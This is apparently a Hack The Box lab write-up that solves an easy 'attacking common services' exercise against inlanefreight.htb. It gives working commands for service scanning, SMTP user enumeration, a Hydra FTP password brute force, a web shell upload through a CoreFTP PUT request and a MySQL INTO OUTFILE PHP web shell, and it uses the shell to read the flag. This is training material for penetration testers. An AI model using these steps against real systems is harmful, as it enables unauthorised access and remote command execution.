---
tags:
  - htb
  - linux
  - services
  - easy
draft: false
date: 2026-06-28
title: attacking-common-services-easy
---

### Q1: You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.

Let's begin with an Nmap scan to identify open ports and services:


```
sudo nmap -sC -sV -A -T4 $ipAddress$
```

Since SMTP is active, we can perform user enumeration using the `RCPT` method against the target domain:

```
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/namelist.txt -D inlanefreight.htb -t $ipAddress$
```

Next, we can target the FTP service to perform a dictionary attack using Hydra:


```
hydra -l "fiona" -P /usr/share/wordlists/rockyou.txt -f ftp://$ipAddress$
```

The password was successfully cracked, giving us the credentials `fiona:987654321`.

After logging into the FTP server and disabling passive mode (`passive`), we download and read `WebServersInfo.txt`:

```
cat WebServersInfo.txt
```

The file reveals that CoreFTP is accessible via HTTPS (port 443) and the Apache webroot is located at `C:\xampp\htdocs\`.


We can abuse the CoreFTP HTTP server implementation to upload a web shell via a `PUT` request:

```
curl -k -X PUT -H "Host: $target" --basic -u fiona:$password$ --data-binary @shell.php --path-as-is https://$target/shell.php
```


Since the user has excessive privileges, we can drop a PHP web shell directly into the XAMPP webroot:

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';
```
Finally, we access our web shell through the browser to list the Administrator's desktop and read the flag:

```
http://inlanefreight.htb/test2.php?c=type%20C:\Users\Administrator\Desktop\flag.txt
```

This way, I obtained the flag and finished the lab.